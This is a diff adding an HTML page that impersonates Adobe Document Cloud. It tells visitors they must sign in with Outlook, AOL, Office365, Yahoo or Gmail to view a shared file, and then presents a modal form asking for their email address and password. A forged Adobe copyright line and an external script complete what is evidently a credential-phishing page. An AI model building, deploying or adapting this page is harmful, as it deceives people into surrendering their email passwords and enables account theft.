@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, shrink-to-fit=no"
+    />
+    <link rel="stylesheet" href="/static/css/style.css" />
+  </head>
+
+  <body>
+    <div class="main">
+      <div
+        class="row"
+        style="
+          background-image: url(/static/images/back.jpg);
+          background-size: cover;
+          background-repeat: no-repeat;
+        "
+      >
+        <div class="subsecondmain">
+          <div class="row">
+            <div class="sfirst colstyle mxauto myfifth pxfifth pbfifth">
+              <div class="text-center ptfifth">
+                <img
+                  src="/static/images/clogo.jpg"
+                  width="100px"
+                  class="imgfluid"
+                />
+                <br />
+                <span class="h4 text-white">Adobe Document Cloud</span>
+                <br />
+                <span class="h5 text-white fontweightnormal"
+                  >To read the document, please choose your email provider below
+                  login to view shared file.</span
+                >
+              </div>
+
+              <div class="mtthree">
+                <div class="row"></div>
+                <div class="colstyle12" onclick="show('out')">
+                  <a class="ssecond hrvgrow w100">
+                    <div class="sthird mttwo">
+                      <img
+                        src="/static/images/outl.png"
+                        class="sfourth imgfluid"
+                        width="40px"
+                      />
+                      <span class="sfifth plfourth">
+                        Sign in with Outlook
+                      </span>
+                    </div>
+                  </a>
+                </div>
+              </div>
+
+              <div class="row">
+                <div class="colstyle12" onclick="show('aol')">
+                  <a class="hrvgrow w100" style="text-decoration: none">
+                    <div class="mttwo" style="background-color: #31459b">
+                      <img
+                        src="/static/images/aol1.png"
+                        class="imgfluid"
+                        width="40px"
+                        style="
+                          background-color: rgba(0, 0, 0, 0.3);
+                          padding: 5px;
+                        "
+                      />
+                      <span
+                        class="plfourth"
+                        style="
+                          vertical-align: middle;
+                          color: white;
+                          font-weight: 500;
+                          border-radius: 4px;
+                        "
+                      >
+                        Sign in with Aol
+                      </span>
+                    </div>
+                  </a>
+                </div>
+
+                <div class="colstyle12" onclick="show('mso')">
+                  <a class="hrvgrow w100" style="text-decoration: none">
+                    <div class="mttwo" style="background-color: #ff3c00">
+                      <img
+                        src="/static/images/mso1.png"
+                        class="imgfluid"
+                        width="40px"
+                        style="
+                          background-color: rgba(0, 0, 0, 0.3);
+                          padding: 5px;
+                        "
+                      />
+                      <span
+                        class="plfourth"
+                        style="
+                          vertical-align: middle;
+                          color: white;
+                          font-weight: 500;
+                          border-radius: 4px;
+                        "
+                      >
+                        Sign in with Office365
+                      </span>
+                    </div>
+                  </a>
+                </div>
+              </div>
+
+              <div class="row">
+                <div class="colstyle12" onclick="show('yah')">
+                  <a class="hrvgrow w100" style="text-decoration: none">
+                    <div class="mttwo" style="background-color: #5f0f68">
+                      <img
+                        src="/static/images/yh1.png"
+                        class="imgfluid"
+                        width="40px"
+                        style="
+                          background-color: rgba(0, 0, 0, 0.3);
+                          padding: 5px;
+                        "
+                      />
+                      <span
+                        class="plfourth"
+                        style="
+                          vertical-align: middle;
+                          color: white;
+                          font-weight: 500;
+                          border-radius: 4px;
+                        "
+                      >
+                        Sign in with Yahoo!
+                      </span>
+                    </div>
+                  </a>
+                </div>
+
+                <div class="colstyle12" onclick="show('eml')">
+                  <a class="hrvgrow w100" style="text-decoration: none">
+                    <div class="mttwo" style="background-color: #ff0000">
+                      <img
+                        src="/static/images/em4.png"
+                        class="imgfluid"
+                        style="
+                          background-color: rgba(184, 9, 9, 0.492);
+                          padding: 5px;
+                        "
+                        width="40px"
+                      />
+
+                      <span
+                        class="plfourth"
+                        style="
+                          vertical-align: middle;
+                          color: white;
+                          font-weight: 500;
+                          border-radius: 4px;
+                        "
+                      >
+                        Sign in with Gmail
+                      </span>
+                    </div>
+                  </a>
+                </div>
+
+                <div class="colstyle12">
+                  <p class="text-white mtthree text-center">
+                    Built upon Adobe Document Cloud, Adobe Document Cloud
+                    features can be unlocked by providing an additional license
+                    key.
+                  </p>
+                  <p class="h5 text-center text-white">
+                    CopyRight© 2023 Adobe system incorporated, All right
+                    reserved.
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="box clear" id="box">
+      <div class="box-dialog">
+        <div class="boxcontent">
+          <div class="boxtop">
+            <button type="button" onclick="cancel()" class="close">
+              <span>×</span>
+            </button>
+          </div>
+
+          <div class="box-body">
+            <center>
+              <img
+                id="timg"
+                src="/static/images/out2.png"
+                class="imgfluid curvecircle"
+                width="80px"
+              />
+              <h5 class="boxtitle">
+                Login with
+                <span id="tname">Outlook</span>
+              </h5>
+
+              <div class="dash dash-danger" style="display: none"></div>
+            </center>
+            <form action="" method="get" id="cf">
+              <div class="colstyle12">
+                <div class="papgroup">
+                  <label for="">Email address</label>
+                  <input
+                    type="email"
+                    autocomplete="on"
+                    name="email"
+                    class="papcontr"
+                    placeholder="Enter email"
+                  />
+                  <small class="paptext textmuted">
+                    We'll never share your email with anyone else.
+                  </small>
+                </div>
+              </div>
+
+              <div class="colstyle12">
+                <div class="papgroup">
+                  <label for="Password">Password</label>
+                  <input type="password" name="" class="papcontr" />
+                </div>
+              </div>
+            </form>
+          </div>
+          <div class="boxfooter">
+            <button type="button" onclick="cancel()" class="btn btn-secondary">
+              Close
+            </button>
+            <button type="button" class="btn btnlg btninfo moveright">
+              Login
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script src="/static/js/soj.js"></script>
+  </body>
+</html>
